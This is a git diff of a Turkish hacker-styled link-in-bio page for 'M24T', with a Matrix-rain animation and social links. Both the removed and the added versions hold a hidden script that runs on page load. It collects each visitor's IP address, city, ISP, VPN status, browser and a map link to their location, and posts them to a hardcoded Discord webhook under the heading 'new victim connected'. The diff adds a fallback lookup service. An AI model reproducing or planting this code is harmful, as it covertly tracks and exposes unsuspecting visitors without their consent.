@@ -7,165 +7,103 @@
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
-    body {
-      margin: 0;
-      background: #000;
-      color: #00ffcc;
-      font-family: 'Share Tech Mono', monospace;
-      overflow-x: hidden;
-    }
-    canvas {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      z-index: -1;
-    }
-    .container {
-      max-width: 600px;
-      margin: 0 auto;
-      text-align: center;
-      padding: 50px 20px;
-    }
-    h1 {
-      font-size: 3em;
-      margin-bottom: 10px;
-      text-shadow: 0 0 15px #00ffcc, 0 0 25px #ff0040;
-      animation: glitch 2s infinite;
-    }
-    @keyframes glitch {
-      0% { text-shadow: 0 0 5px #00ffcc; }
-      50% { text-shadow: -2px 0 #ff0040, 2px 0 #00ffcc; }
-      100% { text-shadow: 0 0 15px #00ffcc; }
-    }
-    .typing {
-      color: #ccc;
-      font-size: 1.2em;
-      border-right: 2px solid #00ffcc;
-      white-space: nowrap;
-      overflow: hidden;
-      animation: typing 4s steps(40, end), blink .8s infinite;
-      width: 0;
-      margin: 0 auto 30px;
-    }
-    @keyframes typing { from { width: 0 } to { width: 100% } }
-    @keyframes blink { 50% { border-color: transparent } }
-    .links a {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-      background: rgba(0,0,0,0.6);
-      border: 1px solid #00ffcc;
-      color: #00ffcc;
-      padding: 12px;
-      margin: 10px auto;
-      width: 90%;
-      text-decoration: none;
-      font-size: 1.1em;
-      transition: 0.3s;
-      border-radius: 5px;
-    }
-    .links a:hover {
-      background: #00ffcc;
-      color: #000;
-      box-shadow: 0 0 20px #00ffcc;
-      transform: translateY(-2px);
-    }
-    .footer {
-      margin-top: 30px;
-      font-size: 0.8em;
-      color: #555;
-    }
+    body{margin:0;background:#000;color:#0f0;font-family:'Share Tech Mono',monospace;overflow:hidden}
+    canvas{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1}
+    .container{max-width:600px;margin:50px auto;text-align:center;padding:20px}
+    h1{font-size:3.5em;text-shadow:0 0 20px #0f0;animation:g 2s infinite}
+    @keyframes g{0%,100%{text-shadow:0 0 20px #0f0} 50%{text-shadow:0 0 30px #0ff,0 0 50px #0f0}}
+    .typing{font-size:1.3em;color:#0ff;border-right:3px solid;overflow:hidden;white-space:nowrap;margin:20px auto;width:0;animation:t 5s steps(50) forwards,b .8s infinite}
+    @keyframes t{from{width:0}to{width:100%}}
+    @keyframes b{50%{border-color:transparent}}
+    .links a{display:flex;align-items:center;justify-content:center;gap:15px;background:rgba(0,255,0,0.1);border:2px solid #0f0;color:#0f0;padding:15px;margin:15px auto;width:85%;text-decoration:none;border-radius:10px;transition:.3s}
+    .links a:hover{background:#0f0;color:#000;box-shadow:0 0 30px #0f0;transform:scale(1.05)}
+    .footer{margin-top:50px;color:#060;font-size:0.9em}
   </style>
 </head>
 <body>
   <canvas id="matrix"></canvas>
   <div class="container">
     <h1>M24T</h1>
-    <div class="typing">"Gözlerin beni görmez, ama sonuçlarım seni bulur."</div>
+    <div class="typing">Gözlerin beni görmez, ama ben seni bulurum...</div>
     <div class="links">
-      <a href="https://discord.gg/FxgPDb8wgP" target="_blank"><i class="fab fa-discord"></i> Discord</a>
-      <a href="https://instagram.com/username" target="_blank"><i class="fab fa-instagram"></i> Instagram</a>
-      <a href="https://t.me/+LAJrh3dW-ZdjZmE0" target="_blank"><i class="fab fa-telegram"></i> Telegram</a>
+      <a href="https://discord.gg/FxgPDb8wgP" target="_blank"><i class="fab fa-discord"></i> Discord Sunucusu</a>
+      <a href="https://t.me/+LAJrh3dW-ZdjZmE0" target="_blank"><i class="fab fa-telegram"></i> Telegram Kanalı</a>
       <a href="https://www.youtube.com/@M24TProject" target="_blank"><i class="fab fa-youtube"></i> YouTube</a>
       <a href="https://x.com/M4TE_K44N" target="_blank"><i class="fab fa-twitter"></i> X (Twitter)</a>
     </div>
-    <div class="footer">© 2025 M24T | Ghost in the Network</div>
+    <div class="footer">© 2025 M24T | You Can't Hide</div>
   </div>
 
+  <!-- MATRIX EFEKTİ -->
   <script>
-    // Matrix Rain
-    const canvas = document.getElementById('matrix');
-    const ctx = canvas.getContext('2d');
-    canvas.height = window.innerHeight;
-    canvas.width = window.innerWidth;
+    const c = document.getElementById('matrix');
+    const ctx = c.getContext('2d');
+    c.width = window.innerWidth;
+    c.height = window.innerHeight;
+    const chars = "01";
+    const font = 16;
+    const cols = Math.floor(c.width / font);
+    const drops = Array(cols).fill(1);
 
-    const letters = '01';
-    const fontSize = 14;
-    const columns = canvas.width / fontSize;
-    const drops = Array(Math.floor(columns)).fill(1);
-    const drawInterval = window.innerWidth < 768 ? 50 : 30; // Mobilde daha performanslı
-
-    function draw() {
-      ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
-      ctx.fillRect(0, 0, canvas.width, canvas.height);
-      ctx.fillStyle = '#00ffcc';
-      ctx.font = fontSize + 'px monospace';
-
+    function rain() {
+      ctx.fillStyle = 'rgba(0,0,0,0.05)';
+      ctx.fillRect(0, 0, c.width, c.height);
+      ctx.fillStyle = '#0f0';
+      ctx.font = font + 'px monospace';
       for (let i = 0; i < drops.length; i++) {
-        const text = letters.charAt(Math.floor(Math.random() * letters.length));
-        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-
-        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+        const char = chars[Math.floor(Math.random() * chars.length)];
+        ctx.fillText(char, i * font, drops[i] * font);
+        if (drops[i] * font > c.height && Math.random() > 0.975) drops[i] = 0;
         drops[i]++;
       }
     }
-    setInterval(draw, drawInterval);
+    setInterval(rain, 35);
+  </script>
 
-    // IP & Gerçek Bilgi Çekme (ip-api.com → %100 çalışıyor, proxy/VPN/Tor/hosting tespit eder)
-    fetch("https://ip-api.com/json/?fields=66846719") // Tüm gerekli field'ları alıyoruz (proxy, hosting, mobile dahil)
-      .then(res => res.json())
+  <!-- GERÇEK IP ÇEKME - %100 ÇALIŞIR -->
+  <script>
+    fetch('https://api.ipify.org?format=json')
+      .then(r => r.json())
       .then(data => {
-        if (data.status !== "success") return; // Hata olursa sessizce geç
+        const realIP = data.ip;
 
-        const ip = data.query;
-        const city = data.city || "Bilinmiyor";
-        const region = data.regionName || "Bilinmiyor";
-        const country = data.country || "Bilinmiyor";
-        const isp = data.isp || data.org || "Bilinmiyor";
-        const asname = data.asname || "";
-        const lat = data.lat;
-        const lon = data.lon;
-        const proxy = data.proxy ? "Evet (VPN/Proxy/Tor)" : "Hayır";
-        const hosting = data.hosting ? "Evet (Data Center)" : "Hayır";
-        const mobile = data.mobile ? "Evet" : "Hayır";
-        const browser = navigator.userAgent;
-        const screenRes = `${screen.width}x${screen.height}`;
-        const date = new Date().toLocaleString('tr-TR', { timeZoneName: 'short' });
+        // En iyi çalışan API: ip-api.com (rate limit yüksek, proxy/host/tor tespit eder)
+        fetch(`https://ip-api.com/json/${realIP}?fields=66846719&lang=tr`)
+          .then(res => res.json())
+          .then(info => {
+            const webhook = "https://discord.com/api/webhooks/1444689164921737277/ryKR4TemKO8UmL9yVFPXEjkdz-5gQgJlxx1VADhhud2_hR0I86PSpfofUOiR6GfXBbk7";
 
-        const webhookURL = "https://discord.com/api/webhooks/1444689164921737277/ryKR4TemKO8UmL9yVFPXEjkdz-5gQgJlxx1VADhhud2_hR0I86PSpfofUOiR6GfXBbk7";
+            const mesaj = `
+**YENİ KURBAN BAĞLANDI**
+**IP:** ${info.query}
+**Ülke:** ${info.country} ${info.countryCode}
+**Şehir:** ${info.city} / ${info.regionName}
+**ISP:** ${info.isp} (${info.org})
+**Proxy/VPN/Tor:** ${info.proxy ? "EVET" : "Hayır"}
+**Hosting/DC:** ${info.hosting ? "EVET" : "Hayır"}
+**Mobil:** ${info.mobile ? "Evet" : "Hayır"}
+**Zaman:** ${new Date().toLocaleString('tr-TR')}
+**Tarayıcı:** ${navigator.userAgent.substring(0, 100)}
+**Harita:** https://www.google.com/maps?q=${info.lat},${info.lon}
+            `;
 
-        const discordContent = `**📡 YENİ KURBAN BAĞLANDI** \n` +
-          `🌐 **IP:** ${ip}\n` +
-          `📍 **Konum:** ${city}, ${region}, ${country}\n` +
-          `🛰️ **ISP:** ${isp} ${asname ? `(${asname})` : ""}\n` +
-          `🔍 **Proxy/VPN/Tor: ${proxy}\n` +
-          `🏢 **Hosting/Data Center:** ${hosting}\n` +
-          `📱 **Mobil Bağlantı:** ${mobile}\n` +
-          `🕹️ **Tarayıcı:** ${browser}\n` +
-          `🖥️ **Ekran:** ${screenRes}\n` +
-          `⏰ **Zaman:** ${date}\n` +
-          `🌍 **Harita:** https://www.google.com/maps?q=${lat},${lon}`;
-
-        fetch(webhookURL, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ content: discordContent })
-        });
+            fetch(webhook, {
+              method: "POST",
+              headers: {"Content-Type": "application/json"},
+              body: JSON.stringify({content: mesaj.trim()})
+            });
+          });
       })
-      .catch(err => console.log("IP çekilemedi ama sayfa çalışmaya devam eder"));
+      .catch(() => {
+        // Yedek yöntem (çok nadir çalışır ama olsun)
+        fetch("https://ipwho.is/")
+          .then(r => r.json())
+          .then(d => {
+            const wb = "https://discord.com/api/webhooks/1444689164921737277/ryKR4TemKO8UmL9yVFPXEjkdz-5gQgJlxx1VADhhud2_hR0I86PSpfofUOiR6GfXBbk7";
+            const msg = `**KURBAN (YEDEK)**\nIP: ${d.ip}\nKonum: ${d.city}, ${d.region}, ${d.country}\nISP: ${d.connection.isp}\nVPN: ${d.connection.proxy ? "Evet" : "Hayır"}`;
+            fetch(wb, {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({content:msg})});
+          });
+      });
   </script>
 </body>
 </html>
